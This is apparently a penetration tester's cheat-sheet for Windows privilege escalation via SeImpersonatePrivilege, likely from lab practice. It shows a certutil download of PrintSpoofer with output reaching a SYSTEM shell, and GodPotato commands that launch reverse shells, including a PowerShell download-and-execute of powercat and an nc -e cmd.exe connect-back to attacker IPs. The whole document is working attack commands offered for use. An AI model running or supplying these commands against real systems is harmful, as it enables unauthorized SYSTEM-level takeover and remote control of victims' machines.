# SeImpersonatePrivilege 
## PrintSpoofer64.exe
```
Impersonate a client after authentication Enabled.
Transferred over PrintSpoofer64.exe with certutil

C:\Users\Public>certutil -urlcache -split -f http://192.168.49.117:443/PrintSpoofer64.exe

Executed PrintSpoofer64.exe -i -c cmd

C:\Users\Public>.\PrintSpoofer64.exe -i -c cmd
.\PrintSpoofer64.exe -i -c cmd
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Microsoft Windows [Version 10.0.17763.2928]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

## God Potato
```
Attacker
nc -lvnp 4444

Target
.\GodPotato-NET35.exe -cmd "C:\Users\wintermute\Desktop\rs4444.exe"
.\GodPotato.exe -cmd "C:\Users\public\revshell.exe"
.\godpotato-net4.exe -cmd "powershell /c  IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.x/powercat.ps1');powercat -c 192.168.45.x -p 443 -e cmd.exe"
.\potato.exe -cmd "C:\Users\Public\nc.exe -t -e C:\Windows\System32\cmd.exe 192.168.45.154 9999"
```
